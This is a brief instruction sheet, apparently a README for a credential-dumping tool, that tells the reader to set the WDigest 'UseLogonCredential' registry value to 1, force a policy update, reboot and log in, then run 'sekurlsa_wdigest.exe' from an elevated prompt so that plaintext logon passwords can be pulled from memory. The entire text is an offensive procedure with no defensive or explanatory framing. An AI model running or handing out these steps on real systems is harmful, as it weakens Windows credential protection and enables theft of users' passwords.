# Forcing WDigest to Store Credentials in Plaintext
Run the following in your elevated prompt before executing the compiled binary:

- reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
- gpupdate /force
- restart your machine and login with your credentials
- Execute sekurlsa_wdigest.exe on elevated prompt.
